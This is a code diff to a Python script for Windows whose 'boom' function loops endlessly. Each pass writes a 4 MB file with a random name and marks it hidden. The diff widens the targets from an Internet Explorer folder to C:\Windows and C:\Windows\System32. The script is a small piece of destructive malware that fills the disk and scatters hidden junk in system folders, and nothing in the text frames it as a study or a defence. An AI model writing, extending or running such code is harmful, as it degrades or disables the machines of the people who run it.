@@ -4,20 +4,20 @@ from time import sleep
 import win32con, win32api
 
 
-def hidden(file_name):
-    win32api.SetFileAttributes(join('C:\Program Files (x86)\Internet Explorer\zh-CN', file_name),
-                               win32con.FILE_ATTRIBUTE_HIDDEN)
 
 
 def boom():
+    directory = ['C:\Program Files (x86)\Internet Explorer\zh-CN',
+                 'C:\Windows',
+                 'C:\Windows\System32']
     while True:
         try:
             name = str(randint(0, 1000000000))
-            with open(
-                    join('C:\Program Files (x86)\Internet Explorer\zh-CN', name), 'w') as file:
+            dir = directory[randint(0, len(directory) - 1)]
+            with open(join(dir, name), 'w') as file:
                 file.seek(1024 * 1024 * 1 * 4)
                 file.write(name)
-                hidden(name)
+                win32api.SetFileAttributes(join(dir, name), win32con.FILE_ATTRIBUTE_HIDDEN)
                 sleep(3)
         except:
             break
